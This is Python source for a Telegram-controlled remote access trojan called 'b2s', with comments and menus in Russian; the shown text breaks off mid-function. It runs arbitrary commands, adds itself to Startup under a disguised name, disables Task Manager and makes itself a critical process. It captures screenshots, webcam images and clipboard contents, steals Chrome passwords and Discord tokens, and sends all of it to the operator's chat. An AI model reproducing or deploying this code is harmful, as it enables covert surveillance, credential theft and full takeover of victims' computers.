# -*- coding: utf-8 -*-

import os
import tempfile
import subprocess
import socket
import uuid
import platform
from requests import get
import json
import urllib.request as ur
import cv2 as cv
import getpass
import random
import ctypes
import Discord
import ctypes, sys


internet = False
while not internet:
    try:
        subprocess.check_call(["ping", "www.google.ru", "-n", "1"])
        print("Internet is up!")
        internet = True
    except subprocess.CalledProcessError:
        exit()

os.system("pip install --upgrade pip")
os.system("pip install pytelegrambotapi")
os.system("pip install Pillow")
os.system("pip install opencv-python")
os.system("pip install pywin32")
os.system("pip3 install pycryptodome")
os.system("pip3 install pypiwin32")
os.system("pip install rotate-screen")
os.system("cls")
print("Modules loaded!")

import telebot
import win32clipboard
import ChromePassword
import rotatescreen









#–ù–∞—Å—Ç—Ä–æ–π–∫–∏

#–¢–æ–∫–µ–Ω –ë–æ—Ç–∞
token = ''
#ChatId
chatid = 
#–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ chatid (True –∏–ª–∏ False)
chatid_check = True
#–ó–∞–ø—É—Å–∫–∞—Ç—å –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ (–ó–∞–ø—É—Å–∫–∞–µ—Ç —Å—Ä–∞–∑—É –≤ —Å–∫—Ä—ã—Ç–æ–º —Ä–µ–∂–∏–º–µ)
startasadmin = False















def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if startasadmin == True:
    if is_admin():
        print("Runned as Admin")
        pass
    else:
        print("Runned as User")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        os._exit(0)
elif startasadmin == False:
    print("Runned as User")

def enableProtection():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
def disableProtection():
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0







hostname=socket.gethostname() 
IPAddr=socket.gethostbyname(hostname) 
USER_NAME = getpass.getuser()
h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "servicehost" + str(random.randint(11111111,99999999)) + ".bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)



def enable_task_manager():
    os.system('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v DisableTaskMgr /t REG_DWORD /d 0')
def disable_task_manager():
    os.system('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v DisableTaskMgr /t REG_DWORD /d 1')




bot = telebot.TeleBot(token)

bot.send_message(chatid, '–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å! \n\n üü¢ ' + str(hostname))

@bot.message_handler(commands=["start"])
def start(m, res=False):
    if chatid_check == True and m.chat.id == chatid:
        pass
    elif chatid_check == True and m.chat.id != chatid:
        print("Some user trying to use this bot when chatid_check is True. ChatId: " + str(m.chat.id) + ' UserName: @' + m.from_user.username)
        return
    elif chatid_check == False:
        pass
    print("New message: " + m.text + ' ChatId: ' + str(m.chat.id) + ' UserName: @' + m.from_user.username)
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ["üíª –û—Å–Ω–æ–≤–Ω–æ–µ", "‚å®Ô∏è –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞", "üöß –ü—Ä–æ—Ü–µ—Å—Å—ã", "üéâ –í–µ—Å–µ–ª—å–µ", "üîë –°—Ç–∏–ª–ª–µ—Ä—ã"]
    keyboard.add(*buttons)
    bot.send_message(m.chat.id, 'b2s - –ø—Ä–æ–≥—Ä–∞–º–º–∞ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞.', reply_markup=keyboard)

@bot.message_handler(content_types=["text"])
def handle_text(message):
    if chatid_check == True and message.chat.id == chatid:
        pass
    elif chatid_check == True and message.chat.id != chatid:
        print("Some user trying to use this bot when chatid_check is True. ChatId: " + str(message.chat.id) + ' UserName: @' + message.from_user.username)
        return
    elif chatid_check == False:
        pass
    print("New message: " + message.text + ' ChatId: ' + str(message.chat.id) + ' UserName: @' + message.from_user.username)
    if message.text == 'üì∏ –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç':
        bot.send_message(message.chat.id, '–ó–∞–≥—Ä—É–∑–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞...')
        print("Uploading screenshot...")
        from PIL import ImageGrab
        snapshot = ImageGrab.grab()
        save_path = tempfile.gettempdir() + "\scr.jpg"
        snapshot.save(save_path)
        bot.send_photo(message.chat.id, photo=open(tempfile.gettempdir() + "\scr.jpg", 'rb'))
        os.remove(tempfile.gettempdir() + "\scr.jpg")
        print("Screenshot sended!")
    if message.text == 'üí¨ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ —Ç–µ–∫—Å—Ç –¥–ª—è MessageBox:')
        bot.register_next_step_handler(msg, sendmessageboxstage)
    if message.text == 'ü§ñ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è:')
        bot.register_next_step_handler(msg, sendcmdcommand)
    if message.text == 'üëÅÔ∏è –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ü–ö':
        url = 'http://ipinfo.io/json'
        response = ur.urlopen(url)
        data = json.load(response)
        org=data['org']
        city = data['city']
        country=data['country']
        region=data['region']
        bot.send_message(message.chat.id, '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö: \n\n–ê–π–ø–∏ –∞–¥—Ä–µ—Å: ' + get('https://api.ipify.org').text + '\n–ò–º—è –ü–ö: ' + hostname + "\n–ò–º—è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: " + USER_NAME + '\n–ú–∞–∫-–ê–¥—Ä–µ—Å: ' + ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]) + '\n–û–°: ' + platform.system() + ' ' + platform.release() + '\n–°—Ç—Ä–∞–Ω–∞: ' + country + '\n–ì–æ—Ä–æ–¥: ' + city + '\n–†–µ–≥–∏–æ–Ω: ' + region + '\n–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ' + org)
    if message.text == 'üìÑ –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤':
        r = str(subprocess.getoutput('{}'.format('tasklist')))
        if len(r) > 4095:
            for x in range(0, len(r), 4095):
                bot.send_message(message.chat.id, '{}'.format(r[x:x + 4095]))
                print(x)
            else:
                bot.send_message(message.chat.id, '{}'.format(r))
    if message.text == 'üì∑ –ü–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –∫–∞–º–µ—Ä—ã':
        cam_port = 0
        cam = cv.VideoCapture(cam_port)
        result, image = cam.read()
        if result:
            cv.imshow("b2s", image)
            cv.imwrite(tempfile.gettempdir() + "\scrwebcam.jpg", image)
            cv.destroyWindow("b2s")
            bot.send_photo(message.chat.id, photo=open(tempfile.gettempdir() + "\scrwebcam.jpg", 'rb'))
            os.remove(tempfile.gettempdir() + "\scrwebcam.jpg")
        else:
            bot.send_message(message.chat.id, "–ö–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
    if message.text == 'üîÑ –ù–∞–∑–∞–¥':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["üíª –û—Å–Ω–æ–≤–Ω–æ–µ", "‚å®Ô∏è –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞", "üöß –ü—Ä–æ—Ü–µ—Å—Å—ã", "üéâ –í–µ—Å–µ–ª—å–µ", "üîë –°—Ç–∏–ª–ª–µ—Ä—ã"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, 'b2s - –ø—Ä–æ–≥—Ä–∞–º–º–∞ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞.', reply_markup=keyboard)
    if message.text == 'üõë –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö':
        bot.send_message(message.chat.id, '–í—ã–∫–ª—é—á–∞–µ–º...')
        os.system("shutdown /s /f /t 0")
    if message.text == 'üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –ü–ö':
        bot.send_message(message.chat.id, '–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º...')
        os.system("shutdown /r /f /t 0")
    if message.text == 'üö™ –í—ã–π—Ç–∏ –∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è':
        bot.send_message(message.chat.id, '–í—ã—Ö–æ–¥–∏–º...')
        os.system("shutdown /l")
    if message.text == '‚ò†Ô∏è –í—ã–∑–≤–∞—Ç—å BSoD':
        bot.send_message(message.chat.id, '–í—ã–∑—ã–≤–∞–µ–º BSoD...')
        os.system("start "" servicehost.exe")
    if message.text == '‚ñ∂Ô∏è –î–æ–±–∞–≤–∏—Ç—å –≤ –ê–≤—Ç–æ–ó–∞–≥—Ä—É–∑–∫—É':
        bot.send_message(message.chat.id, '–î–æ–±–∞–≤–ª—è–µ–º –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É...')
        add_to_startup(os.path.realpath(__file__))
        bot.send_message(message.chat.id, '–£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É.')
    if message.text == 'üìÑ –°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Ç–µ–∫—Å—Ç':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ —Ç–µ–∫—Å—Ç:')
        bot.register_next_step_handler(msg, copytext)
    if message.text == 'üìÑ –£–±–∏—Ç—å –ü—Ä–æ—Ü–µ—Å—Å':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞:')
        bot.register_next_step_handler(msg, taskkillprocces)
    if message.text == 'üìÑ –û—Ç–∫—Ä—ã—Ç—å –ü—Ä–æ—Ü–µ—Å—Å':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ø—É—Ç—å –∫ –ø—Ä–æ–≥—Ä–∞–º–º–µ:')
        bot.register_next_step_handler(msg, openprocess)
    if message.text == 'ü•µ –ù–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä':
        os.system('start "" "cpuload.py"')
    if message.text == 'üó£ –ü—Ä–æ–∏–∑–Ω–µ—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ (–∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ –Ω–∞ –∞–Ω–≥–ª–∏–π—Å–∫–æ–º —è–∑—ã–∫–µ):')
        bot.register_next_step_handler(msg, sendmessagespeakstage)
    if message.text == 'üîó –û—Ç–∫—Ä—ã—Ç—å URL':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ —Å—Å—ã–ª–∫—É:')
        bot.register_next_step_handler(msg, openurl)
    if message.text == 'üìú –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ø—É—Ç—å –∫ –æ–±–æ—è–º:')
        bot.register_next_step_handler(msg, changewallpaper)
    if message.text == 'üíø –û—Ç–∫—Ä—ã—Ç—å CD Rom':
        bot.send_message(message.chat.id, 'CD Rom –æ—Ç–∫—Ä—ã—Ç!')
        os.system("taskkill /f /im wscript.exe > nul")
        try:
            os.remove(tempfile.gettempdir() + '\zebra.vbs')
        except FileNotFoundError:
            print("File VBS are not created.")
        file_name = tempfile.gettempdir() + '\zebra.vbs'
        f = open(file_name, 'a+')
        f.write('CreateObject("WMPlayer.OCX.7").cdromCollection.Item(i).Eject')
        f.close()
        os.system(tempfile.gettempdir() + '\zebra.vbs')
        if "wscript.exe" in os.popen('wmic process get description').read():
            os.remove(tempfile.gettempdir() + '\zebra.vbs')
        print("CDROM ejected!")
    if message.text == 'üëéüèø –°–∫—Ä—ã—Ç—å TaskBar':
        bot.send_message(message.chat.id, 'TaskBar —Å–∫—Ä—ã—Ç')
        ctypes.windll.user32.ShowWindow(h, 0)
    if message.text == 'üëçüèø –ü–æ–∫–∞–∑–∞—Ç—å TaskBar':
        bot.send_message(message.chat.id, 'TaskBar –ø–æ–∫–∞–∑–∞–Ω')
        ctypes.windll.user32.ShowWindow(h, 9)
    if message.text == 'üìÅ –£–±–∏—Ç—å explorer':
        bot.send_message(message.chat.id, 'Explorer —Å–∫—Ä—ã—Ç')
        os.system("taskkill /f /im explorer.exe")
    if message.text == 'üìÅ –í–µ—Ä–Ω—É—Ç—å explorer':
        bot.send_message(message.chat.id, 'Explorer –ø–æ–∫–∞–∑–∞–Ω')
        os.system("explorer")
    if message.text == 'üñ•Ô∏è –í—ã–∫–ª—é—á–∏—Ç—å –î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á':
        bot.send_message(message.chat.id, '–î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á –≤—ã–∫–ª—é—á–µ–Ω.')
        disable_task_manager()
    if message.text == 'üñ•Ô∏è –í–∫–ª—é—á–∏—Ç—å –î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á':
        bot.send_message(message.chat.id, '–î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á –≤–∫–ª—é—á–µ–Ω.')
        enable_task_manager()
    if message.text == 'üîë –ü–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω –î–∏—Å–∫–æ—Ä–¥–∞':
        bot.send_message(message.chat.id, '–¢–æ–∫–µ–Ω –î–∏—Å–∫–æ—Ä–¥–∞: ' + Discord.DiscordToken())
    if message.text == 'üîë –ü–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª–∏ Chrome':
        r = ChromePassword.main()
        file_name = tempfile.gettempdir() + "\pwd_b2s.txt"
        f = open(file_name, 'a+')  # open file in append mode
        f.write(r)
        f.close()
        bot.send_document(chat_id=message.chat.id, document=open(tempfile.gettempdir() + "\pwd_b2s.txt", 'rb'))
        os.remove(tempfile.gettempdir() + "\pwd_b2s.txt")
    if message.text == "üîä –í–æ–∏—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫":
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É:')
        bot.register_next_step_handler(msg, playsound)
    if message.text == "üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª":
        msg = bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å —Å—é–¥–∞ —Ñ–∞–π–ª:')
        bot.register_next_step_handler(msg, uploadfile)
    if message.text == "üìÅ –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª":
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É:')
        bot.register_next_step_handler(msg, removefile)
    if message.text == 'üìÑ –ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à—É':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –∫–ª–∞–≤–∏—à—É (–í–æ–∑–º–æ–∂–Ω—ã–µ –∫–ª–∞–≤–∏—à–∏: https://ss64.com/vb/sendkeys.html , –∞ —Ç–∞–∫–∂–µ –º–æ–∂–Ω–æ –ø–∏—Å–∞—Ç—å —Å–ª–æ–≤–∞):')
        bot.register_next_step_handler(msg, sendkey)
    if message.text == 'üîÅ –ü–æ–≤–µ—Ä–Ω—É—Ç—å —ç–∫—Ä–∞–Ω (–ü–µ–π–∑–∞–∂)':
        bot.send_message(message.chat.id, '–≠–∫—Ä–∞–Ω –ø–æ–≤–µ—Ä–Ω—É—Ç.')
        screen = rotatescreen.get_primary_display()
        screen.set_landscape()
    if message.text == 'üîÅ –ü–æ–≤–µ—Ä–Ω—É—Ç—å —ç–∫—Ä–∞–Ω (–ü–µ–π–∑–∞–∂ –ü–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç—ã–π)':
        bot.send_message(message.chat.id, '–≠–∫—Ä–∞–Ω –ø–æ–≤–µ—Ä–Ω—É—Ç.')
        screen = rotatescreen.get_primary_display()
        screen.set_landscape_flipped()
    if message.text == 'üìÑ –ü–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç –∏–∑ –ë—É—Ñ–µ—Ä–∞':
        win32clipboard.OpenClipboard()
        buffercopied_text = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        bot.send_message(message.chat.id, '–¢–µ–∫—É—â–∏–π —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç: ' + str(buffercopied_text))
    if message.text == 'üìÅ –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª':
        msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É:')
        bot.register_next_step_handler(msg, downloadfile)
    if message.text == 'üîí –í–∫–ª—é—á–∏—Ç—å –∑–∞—â–∏—Ç—É –æ—Ç —Å–Ω—è—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞':
        if startasadmin == True:
            enableProtection()
            bot.send_message(message.chat.id, '–í–∫–ª—é—á–µ–Ω–∞ –∑–∞—â–∏—Ç–∞!')
        elif startasadmin == False:
            bot.send_message(message.chat.id, '–î–ª—è —ç—Ç–æ–≥–æ –Ω—É–∂–Ω—ã –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!')
    if message.text == 'üîì –í—ã–∫–ª—é—á–∏—Ç—å –∑–∞—â–∏—Ç—É –æ—Ç —Å–Ω—è—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞':
        if startasadmin == True:
            disableProtection()
            bot.send_message(message.chat.id, '–í—ã–∫–ª—é—á–µ–Ω–∞ –∑–∞—â–∏—Ç–∞!')
        elif startasadmin == False:
            bot.send_message(message.chat.id, '–î–ª—è —ç—Ç–æ–≥–æ –Ω—É–∂–Ω—ã –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!')



    if message.text == 'üíª –û—Å–Ω–æ–≤–Ω–æ–µ':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["üì∏ –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç", "ü§ñ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É", "üëÅÔ∏è –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ü–ö", "üì∑ –ü–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –∫–∞–º–µ—Ä—ã", "üõë –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –ü–ö", "üö™ –í—ã–π—Ç–∏ –∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", "‚ò†Ô∏è –í—ã–∑–≤–∞—Ç—å BSoD", "‚ñ∂Ô∏è –î–æ–±–∞–≤–∏—Ç—å –≤ –ê–≤—Ç–æ–ó–∞–≥—Ä—É–∑–∫—É", "üñ•Ô∏è –í—ã–∫–ª—é—á–∏—Ç—å –î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á", "üñ•Ô∏è –í–∫–ª—é—á–∏—Ç—å –î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á", "üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª", "üìÅ –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª", "üìÅ –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª", "üîÑ –ù–∞–∑–∞–¥"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, '–û—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=keyboard)
    if message.text == '‚å®Ô∏è –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["üìÑ –°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Ç–µ–∫—Å—Ç", "üìÑ –ü–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç –∏–∑ –ë—É—Ñ–µ—Ä–∞", "üìÑ –ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à—É", "üîÑ –ù–∞–∑–∞–¥"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, '–ö–ª–∞–≤–∏–∞—Ç—É—Ä–Ω–æ–µ –º–µ–Ω—é', reply_markup=keyboard)
    if message.text == 'üöß –ü—Ä–æ—Ü–µ—Å—Å—ã':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["üìÑ –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤", "üìÑ –£–±–∏—Ç—å –ü—Ä–æ—Ü–µ—Å—Å", "üìÑ –û—Ç–∫—Ä—ã—Ç—å –ü—Ä–æ—Ü–µ—Å—Å", "ü•µ –ù–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä", "üîí –í–∫–ª—é—á–∏—Ç—å –∑–∞—â–∏—Ç—É –æ—Ç —Å–Ω—è—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞", "üîì –í—ã–∫–ª—é—á–∏—Ç—å –∑–∞—â–∏—Ç—É –æ—Ç —Å–Ω—è—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞", "üîÑ –ù–∞–∑–∞–¥"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, '–ü—Ä–æ—Ü–µ—Å—Å–æ–≤–æ–µ –º–µ–Ω—é', reply_markup=keyboard)
    if message.text == 'üéâ –í–µ—Å–µ–ª—å–µ':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["üí¨ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ", "üó£ –ü—Ä–æ–∏–∑–Ω–µ—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ", "üîä –í–æ–∏—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫", "üîó –û—Ç–∫—Ä—ã—Ç—å URL", "üìú –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏", "üíø –û—Ç–∫—Ä—ã—Ç—å CD Rom", "üëéüèø –°–∫—Ä—ã—Ç—å TaskBar", "üëçüèø –ü–æ–∫–∞–∑–∞—Ç—å TaskBar", "üìÅ –£–±–∏—Ç—å explorer", "üìÅ –í–µ—Ä–Ω—É—Ç—å explorer", "üîÅ –ü–æ–≤–µ—Ä–Ω—É—Ç—å —ç–∫—Ä–∞–Ω (–ü–µ–π–∑–∞–∂)", "üîÅ –ü–æ–≤–µ—Ä–Ω—É—Ç—å —ç–∫—Ä–∞–Ω (–ü–µ–π–∑–∞–∂ –ü–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç—ã–π)", "üîÑ –ù–∞–∑–∞–¥"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, '–í–µ—Å–µ–ª–æ–µ –º–µ–Ω—é :)', reply_markup=keyboard)
    if message.text == 'üîë –°—Ç–∏–ª–ª–µ—Ä—ã':
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = ["üîë –ü–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω –î–∏—Å–∫–æ—Ä–¥–∞", "üîë –ü–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª–∏ Chrome", "üîÑ –ù–∞–∑–∞–¥"]
        keyboard.add(*buttons)
        bot.send_message(message.chat.id, '–ú–µ–Ω—é —Å–æ —Å—Ç–∏–ª–ª–µ—Ä–∞–º–∏', reply_markup=keyboard)


def sendmessageboxstage(message):
    bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('MsgBox "' + '{}'.format(message.text) +'", vbSystemModal')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("MessageBox sended!")
def sendcmdcommand(message):
    os.system('{}'.format(message.text))
    bot.send_message(message.chat.id, '–ò—Å–ø–æ–ª–Ω–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞: {}'.format(message.text) + '\n\n–õ–æ–≥–∏ –∫–æ–º–∞–Ω–¥—ã: ' + '*' + str(subprocess.getoutput('{}'.format(message.text)) + '*'), parse_mode='Markdown')

def copytext(message):
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText('{}'.format(message.text))
    win32clipboard.CloseClipboard()
    print("Copied text: " + '{}'.format(message.text))
    bot.send_message(message.chat.id, '–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ç–µ–∫—Å—Ç: {}'.format(message.text))

def taskkillprocces(message):
    os.system("taskkill /f /im " + '{}'.format(message.text))
    bot.send_message(message.chat.id, '–ü—Ä–æ—Ü–µ—Å—Å {}'.format(message.text) + ' —Å–Ω—è—Ç!')
def openprocess(message):
    os.system('start "" "' + '{}'.format(message.text) + '"')
    bot.send_message(message.chat.id, '–ü—Ä–æ—Ü–µ—Å—Å {}'.format(message.text) + ' –∑–∞–ø—É—â–µ–Ω!')
def sendmessagespeakstage(message):
    bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('CreateObject("SAPI.SpVoice").Speak"' + '{}'.format(message.text) + '"')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("TTS sended!")
def openurl(message):
    os.system('start "" "' + '{}'.format(message.text) + '"')
    bot.send_message(message.chat.id, '–°—Å—ã–ª–∫–∞ {}'.format(message.text) + ' –æ—Ç–∫—Ä—ã—Ç–∞!')
def changewallpaper(message):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, '{}'.format(message.text) , 0)
    bot.send_message(message.chat.id, '–û–±–æ–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã')

def playsound(message):
    bot.send_message(message.chat.id, '–ü—Ä–æ–∏–≥—Ä–∞–Ω —Ñ–∞–π–ª: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('Set WMP = WScript.CreateObject("MediaPlayer.MediaPlayer","WMP_")\n')
    f.write('WMP.Open "' + '{}'.format(message.text) + '"\n')
    f.write('WMP.Play\n')
    f.write('WScript.Sleep 7000')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("Sound played!")
def uploadfile(message):
    file_info = bot.get_file('{}'.format(message.document.file_id))
    downloaded_file = bot.download_file(file_info.file_path)
    originalfile_name = '{}'.format(message.document.file_name)
